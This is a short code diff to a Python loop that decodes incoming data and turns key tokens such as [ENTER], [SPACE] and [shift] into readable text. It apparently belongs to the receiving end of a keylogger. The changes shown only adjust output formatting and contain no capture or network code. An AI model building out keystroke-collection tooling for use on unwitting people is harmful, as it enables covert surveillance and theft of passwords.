@@ -61,8 +61,11 @@ while True:
 
         texto = data.decode('utf-8', errors='ignore')
         
-        texto = texto.replace('[BACK]', '')
+        texto = texto.replace('[ENTER]', '\n')
+        texto = texto.replace('[SPACE]', ' ')
+        texto = texto.replace('[BACK]', '[←]')
         texto = texto.replace('[TAB]', '\t')
+        texto = texto.replace('[ESC]', '[ESC]')
         texto = texto.replace('[shift]', '')
         texto = texto.replace('[shift_r]', '')
         texto = texto.replace('[caps_lock]', '')
@@ -71,9 +74,9 @@ while True:
         texto = texto.replace('[alt]', '')
         texto = texto.replace('[alt_r]', '')
         texto = texto.replace('[cmd]', '')
-        texto = texto.replace('[Key.', '[')
         
-        print(texto, end='', flush=True)
+        if texto.strip():
+            print(texto, end='', flush=True)
 
     except KeyboardInterrupt:
         print("\n\n" + "="*60)
